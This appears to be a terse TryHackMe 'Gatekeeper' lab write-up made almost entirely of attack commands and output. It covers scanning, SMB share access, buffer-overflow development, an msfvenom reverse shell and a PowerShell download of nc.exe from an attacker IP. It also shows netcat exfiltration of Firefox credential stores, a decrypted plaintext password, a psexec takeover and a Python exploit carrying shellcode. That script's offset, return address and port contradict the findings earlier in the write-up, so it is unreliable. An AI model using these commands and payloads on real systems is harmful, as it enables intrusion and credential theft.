## nmap -sVC -A 10.10.46.153
```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-20 22:34 EET
Nmap scan report for 10.10.46.153
Host is up (0.37s latency).
Not shown: 988 closed ports
PORT      STATE    SERVICE            VERSION
53/tcp    filtered domain
135/tcp   open     msrpc              Microsoft Windows RPC
139/tcp   open     netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open     ssl/ms-wbt-server?
|_ssl-date: 2022-03-20T20:38:01+00:00; 0s from scanner time.
31337/tcp open     Elite?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines: 
|     Hello 
|     Hello
|   GetRequest: 
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions: 
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Help: 
|     Hello HELP
|   Kerberos: 
|     Hello !!!
|   LDAPSearchReq: 
|     Hello 0
|     Hello
|   LPDString: 
|     Hello 
|     default!!!
|   RTSPRequest: 
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions: 
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm;branch=foo
|     Hello From: <sip:nm@nm>;tag=root
|     Hello To: <sip:nm2@nm2>
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: <sip:nm@nm>
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Hello
49152/tcp open     msrpc              Microsoft Windows RPC
49153/tcp open     msrpc              Microsoft Windows RPC
49154/tcp open     msrpc              Microsoft Windows RPC
49155/tcp open     msrpc              Microsoft Windows RPC
49161/tcp open     msrpc              Microsoft Windows RPC
49165/tcp open     msrpc              Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.80%I=7%D=3/20%Time=62378FEE%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,24,"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r
SF:(SIPOptions,142,"Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\x20
SF:Via:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20<sip:nm@n
SF:m>;tag=root\r!!!\nHello\x20To:\x20<sip:nm2@nm2>\r!!!\nHello\x20Call-ID:
SF:\x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-Forw
SF:ards:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contact:
SF:\x20<sip:nm@nm>\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello\x
SF:20\r!!!\n")%r(GenericLines,16,"Hello\x20\r!!!\nHello\x20\r!!!\n")%r(HTT
SF:POptions,28,"Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n"
SF:)%r(RTSPRequest,28,"Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x20\
SF:r!!!\n")%r(Help,F,"Hello\x20HELP\r!!!\n")%r(SSLSessionReq,C,"Hello\x20\
SF:x16\x03!!!\n")%r(TerminalServerCookie,B,"Hello\x20\x03!!!\n")%r(TLSSess
SF:ionReq,C,"Hello\x20\x16\x03!!!\n")%r(Kerberos,A,"Hello\x20!!!\n")%r(Fou
SF:rOhFourRequest,47,"Hello\x20GET\x20/nice%20ports%2C/Tri%6Eity\.txt%2eba
SF:k\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(LPDString,12,"Hello\x20\x01de
SF:fault!!!\n")%r(LDAPSearchReq,17,"Hello\x200\x84!!!\nHello\x20\x01!!!\n"
SF:);
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=3/20%OT=135%CT=1%CU=40356%PV=Y%DS=4%DC=T%G=Y%TM=623790
OS:E5%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=I%CI=I%TS=7)SEQ(SP=
OS:105%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=7)OPS(O1=M508NW8ST11%O2=M508NW8
OS:ST11%O3=M508NW8NNT11%O4=M508NW8ST11%O5=M508NW8ST11%O6=M508ST11)WIN(W1=20
OS:00%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M5
OS:08NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80
OS:%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q
OS:=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A
OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%D
OS:F=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL
OS:=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 4 hops
Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 59m59s, deviation: 2h00m00s, median: -1s
|_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: <unknown>, NetBIOS MAC: 02:b9:d1:f3:02:ab (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: gatekeeper
|   NetBIOS computer name: GATEKEEPER\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-03-20T16:37:51-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-03-20T20:37:51
|_  start_date: 2022-03-20T20:32:16

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   256.72 ms 10.2.0.1
2   ... 3
4   367.58 ms 10.10.46.153

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 296.26 seconds
```
## SMB Enumeration
### smbclient -L //10.10.46.153  -N  
```bash
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.46.153 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
### smbclient //10.10.46.153/Users -N
```bash
smb: \> dir
  .                                  DR        0  Fri May 15 03:57:08 2020
  ..                                 DR        0  Fri May 15 03:57:08 2020
  Default                           DHR        0  Tue Jul 14 10:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 07:54:24 2009
  Share                               D        0  Fri May 15 03:58:07 2020

		7863807 blocks of size 4096. 3878981 blocks available
smb: \> cd Share
smb: \Share\> dir
  .                                   D        0  Fri May 15 03:58:07 2020
  ..                                  D        0  Fri May 15 03:58:07 2020
  gatekeeper.exe                      A    13312  Mon Apr 20 07:27:17 2020

		7863807 blocks of size 4096. 3878981 blocks available
smb: \Share\> get gatekeeper.exe 
getting file \Share\gatekeeper.exe of size 13312 as gatekeeper.exe (5.1 KiloBytes/sec) (average 5.1 KiloBytes/sec)
```

# Buffer Overflow
## Fuzzing
```
crashed with 200 bytes
```
## EIP Offset
### pattern_create.rb -l 300
```
EIP = 39654138
```
### pattern_offset.rb -q 39654138
```
[*] Exact match at offset 146
```
## Finding Bad Characters 
### !mona bytearray -b "\x00"
### !mona compare -f "D:\_Tooooools\Immunity Debugger\bytearray.bin" -a 023519E4
```bash
 Message=Possibly bad chars: 01
```
### !mona bytearray -b "\x00\x01"
### !mona compare -f "D:\_Tooooools\Immunity Debugger\bytearray.bin" -a 0019FA20
```bash
 Message=Possibly bad chars: 0a
```
### !mona bytearray -b "\x00\x01\x0a"
### !mona compare -f "D:\_Tooooools\Immunity Debugger\bytearray.bin" -a  023519E4
```bash
Log data, item 3
 Address=023519E4
 Message=!!! Hooray, normal shellcode unmodified !!!
```
## Jump Address
### !mona modules
```
Log data, item 21
 Address=0BADF00D
 Message= 0x08040000 | 0x08048000 | 0x00008000 | False  | True    | False |  False   | False  | -1.0- [gatekeeper.exe] (E:\_try hack me\_offensive pentesting\gatekeeper.exe)
```
### !mona jmp -r esp -m "gatekeeper.exe"
```
Log data, item 4
 Address=080414C3
 Message=  0x080414c3 : jmp esp |  {PAGE_EXECUTE_READ} [gatekeeper.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (E:\_try hack me\_offensive pentesting\gatekeeper.exe)
```

## Payload
### msfvenom -p windows/shell_reverse_tcp LHOST=10.2.92.176 LPORT=5555 -e x86/shikata_ga_nai -f py -v shell -b "\x00\x01\x0a"

## Exploit
```bash
 
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.2.92.176:8000/nc.exe','C:\Users\natbat\Desktop\nc.exe')"


nc -nlvp 4444 > places.sqlite
nc -nv 10.2.92.176 4444 < C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\places.sqlite


nc -nlvp 4444 > key4.db
nc -nv 10.2.92.176 4444 < C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\key4.db

nc -nlvp 4444 > logins.json
nc -nv 10.2.92.176 4444 < C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\logins.json

nc -nlvp 4444 > cert9.db
nc -nv 10.2.92.176 4444 < C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\cert9.db
```

## python3.9 firefoxdecrypt.py  brainsorm
```bash
Website:   https://creds.com
Username: 'mayor'
Password: '8CL7O1N78MdrCIsV'
```
##python3.9 psexec.py mayor:8CL7O1N78MdrCIsV@10.10.46.153 cmd.exe
```bash 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.46.153.....
[*] Found writable share ADMIN$
[*] Uploading file pMZaCnmP.exe
[*] Opening SVCManager on 10.10.46.153.....
[*] Creating service VPWo on 10.10.46.153.....
[*] Starting service VPWo.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> cd C:\Users

C:\Users> cd mayor

C:\Users\mayor> cd Desktop

C:\Users\mayor\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of C:\Users\mayor\Desktop

05/14/2020  09:58 PM    <DIR>          .
05/14/2020  09:58 PM    <DIR>          ..
05/14/2020  09:21 PM                27 root.txt.txt
               1 File(s)             27 bytes
               2 Dir(s)  15,836,430,336 bytes free

C:\Users\mayor\Desktop> type root.txt.txt
***********
```


# Exploit Code
```python
import socket
import sys
import os

#ip="127.0.0.1"
ip = "10.10.46.153"

port = 9999
pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2C"

badChars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

shell =  b""
shell += b"\xbb\xb0\x97\x15\xd9\xd9\xcb\xd9\x74\x24\xf4\x5a"
shell += b"\x29\xc9\xb1\x52\x31\x5a\x12\x83\xc2\x04\x03\xea"
shell += b"\x99\xf7\x2c\xf6\x4e\x75\xce\x06\x8f\x1a\x46\xe3"
shell += b"\xbe\x1a\x3c\x60\x90\xaa\x36\x24\x1d\x40\x1a\xdc"
shell += b"\x96\x24\xb3\xd3\x1f\x82\xe5\xda\xa0\xbf\xd6\x7d"
shell += b"\x23\xc2\x0a\x5d\x1a\x0d\x5f\x9c\x5b\x70\x92\xcc"
shell += b"\x34\xfe\x01\xe0\x31\x4a\x9a\x8b\x0a\x5a\x9a\x68"
shell += b"\xda\x5d\x8b\x3f\x50\x04\x0b\xbe\xb5\x3c\x02\xd8"
shell += b"\xda\x79\xdc\x53\x28\xf5\xdf\xb5\x60\xf6\x4c\xf8"
shell += b"\x4c\x05\x8c\x3d\x6a\xf6\xfb\x37\x88\x8b\xfb\x8c"
shell += b"\xf2\x57\x89\x16\x54\x13\x29\xf2\x64\xf0\xac\x71"
shell += b"\x6a\xbd\xbb\xdd\x6f\x40\x6f\x56\x8b\xc9\x8e\xb8"
shell += b"\x1d\x89\xb4\x1c\x45\x49\xd4\x05\x23\x3c\xe9\x55"
shell += b"\x8c\xe1\x4f\x1e\x21\xf5\xfd\x7d\x2e\x3a\xcc\x7d"
shell += b"\xae\x54\x47\x0e\x9c\xfb\xf3\x98\xac\x74\xda\x5f"
shell += b"\xd2\xae\x9a\xcf\x2d\x51\xdb\xc6\xe9\x05\x8b\x70"
shell += b"\xdb\x25\x40\x80\xe4\xf3\xc7\xd0\x4a\xac\xa7\x80"
shell += b"\x2a\x1c\x40\xca\xa4\x43\x70\xf5\x6e\xec\x1b\x0c"
shell += b"\xf9\x19\xde\x52\x49\x75\xdc\x6a\xbc\x35\x69\x8c"
shell += b"\xd4\x29\x3c\x07\x41\xd3\x65\xd3\xf0\x1c\xb0\x9e"
shell += b"\x33\x96\x37\x5f\xfd\x5f\x3d\x73\x6a\x90\x08\x29"
shell += b"\x3d\xaf\xa6\x45\xa1\x22\x2d\x95\xac\x5e\xfa\xc2"
shell += b"\xf9\x91\xf3\x86\x17\x8b\xad\xb4\xe5\x4d\x95\x7c"
shell += b"\x32\xae\x18\x7d\xb7\x8a\x3e\x6d\x01\x12\x7b\xd9"
shell += b"\xdd\x45\xd5\xb7\x9b\x3f\x97\x61\x72\x93\x71\xe5"
shell += b"\x03\xdf\x41\x73\x0c\x0a\x34\x9b\xbd\xe3\x01\xa4"
shell += b"\x72\x64\x86\xdd\x6e\x14\x69\x34\x2b\x24\x20\x14"
shell += b"\x1a\xad\xed\xcd\x1e\xb0\x0d\x38\x5c\xcd\x8d\xc8"
shell += b"\x1d\x2a\x8d\xb9\x18\x76\x09\x52\x51\xe7\xfc\x54"
shell += b"\xc6\x08\xd5"


#625014df
n=0
while True:
 try:
   print ("Sending ",n,"Bytes")
   
   #payload="A"*n 
   #payload= pattern

   payload="A"*(2012)+"\xdf\x14\x50\x62" +"\x90"*16 +shell + "\x90"*(2200-2012-4-16-len(shell))

   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((ip, port))
   
   s.send("aaaa")
   print (s.recv(1024))

   s.send(payload)
   print (s.recv(1024))

   s.close()
   #break
   n+=100
   
 except Exception as e:
           print (e)
           print("crashed at, ",n)
           break
```
